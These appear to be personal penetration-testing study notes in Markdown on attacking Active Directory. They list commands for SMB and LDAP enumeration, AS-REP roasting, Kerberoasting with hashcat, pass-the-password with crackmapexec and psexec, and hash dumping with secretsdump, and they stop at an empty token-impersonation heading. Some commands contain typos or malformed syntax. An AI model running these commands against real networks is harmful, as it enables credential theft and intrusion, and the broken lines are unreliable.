# Getting Initial Foodhold (We need Credentials!! User names are golden :) )
1. Determine the IP address or hostname of the Active Directory server. If we seen( port 53 445, 389, 88, we are most likely dealing with AD)
2. Enumerate DNS
3. Check open ports: Enumerate SMB: If port 445 is open, use tools like enum4linux, smbmap, smbclient crackmapexec to gather information about the SMB service, such as shared folders and users.
4. Enumerate LDAP: If port 389 or 3268/3269 is open, use tools like ldapsearch, to gather information about the LDAP directory service, such as users, groups, and organizational units.
5. Enumerate Kerberos: If port 88 is open, use tools like krb5-enum-users or enum-users-gpp-decrypt to enumerate users and potentially crack Kerberos passwords.
6. Enumerate RPC: If port 135 is open, use tools like rpcclient or nmap-rpc-info to gather information about the RPC service and potentially identify vulnerable endpoints.
7. Check for group policy: (Groups.xml for Windows 12 and below) Look for group policy information in the directory, use tools like gpp-decrypt to decrypt and extract any saved credentials.
   - open the Groups.xml file. decrpyt the password hash by `gpp-decrypt $HASH`
9. Check for computer accounts: Look for computer accounts in the directory, which can be used to identify and target specific systems on the network.
10. Look for organizational units (OUs): Check for OUs in the directory, which can be used to identify the structure and organization of the network.
11. https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg  Look at this roadmap

## Enumeration
1. `nmap -sC -sV -p -oA result 10.0.0.0./8`
2. Edit host file `subl /etc/hosts to add domain`

## Port 53 DNS
1. `nslookup` 
2. `server $IP` then type -> `$IP` to figure out the host name. 
3. `dnsrecon -d $IP -r $IP
4. 
## Port 445 SMB (Check SMB.md file)
1. `nmap --script safe -p 445, $IP`
2. `enum4linux $IP`
3. `smbmap -H $IP` (anonymous login) 
4. `smbmap -R $Filename $IP` (list the content of the directroy)
5. `smbmap -R Filename $IP -A $FiletoDownload -q` (Download the intersting file such as Groups.xml)  `update db` and `locate $Filename`. 
6. `crackmapexec smb $IP -u '' -p'' ` or `crackmapexec smb $IP -u 'guest' -p''` to try to access.
## Port 389, 636, 3268, 3269 LDAP 
1. `nmap -n -sV --script "ldap* and not brute*" -p 389 $Ip` 
2.  `ldapsearch -x 
```
ldapsearch -x -h <IP> -s base namingcontexts
[Parse through the returned naming contexts, then enumerate each one]:
ldapsearch -x -h <IP> -b ‘DC=EGOTISTICAL-BANK,DC=LOCAL’
[You can further query specific sections of each naming context]:
ldapsearch -h <IP> -x -b “DC=cascade,DC=local” ‘(objectClass=person)’

```
## AS-REP Roasting (Authentication Reply Roasting)
1. If pre-authentication is disabled, and we provide a list of userlists to the domain controller (AS-REQ), the DC will grant us TGT. If the passwords are weak, we can crack the TGT and gain access. We can use krebrute, impacket, or crackmap
2. If we dont find some misconfiguration or user name try using this username list `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` 
3. or `https://github.com/jeanphorn/wordlist/blob/master/usernames.txt` for the below command
4. `kerbrute userenum --dc $IP -d DOMAIN.NAME user.txt` user.txt is a userlist that we have created to authenticate to DC.
5. `impacket-GetNPUsers -userfile user.txt -dc-ip $IP DOMAIN.NAME/`
6. Crack the hash
# After initial shell, credentials or some password (Enumeration)
1. Things we want to know, domain admins, 
2. Enumerate the initial target using powerview. Trasfer file to target.
3. https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
4. Transfer Powerview via
5. `powershell -ep bypass ` `. .\PowerView.ps1` 
6. `Get-NetDomain` , (domain info) `net user` (for local accounts) `net user /domain` (for all domain users) `net user <USERNAME>
7. `Get-NetDomainController` (for DC info, DC IP)
## Kerbreroasting (Service account)
1. Once we have creds, we ask the Domian Controller for TGS (since we can request TGT) and try to crack TGS hash.
```
impacket-GetUserSPNs <IP or hostname>/<username>:<password> -request [add -request if SPN is found]
[save hash and crack with hashcat]
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
## Pass the Password Attack
1. Lets say we have some credentials. Lets try to pass the password/hash to other connected networks. 
2. `crackmapexec 192.168.119.0/24 -u SOMEUSERNAME -d DOMAIN.LOCAL -p SOMEPASSWORD` 
3. `psexec DOMAIN/username:SOMEPASSWORD@TARGETIP ` to login if sucessful
## Dump the hash 
1. We have a user account and pssexed into an account. We want to dump hashes.
2. `secretsdump.py Domain/USERNAME:SOMEPASSWORD@TargetIP`
3. `crackmapexec smb $IP.0/24 -u "UserNmae" -H <Hash> --local-auth
## Token Impersonation
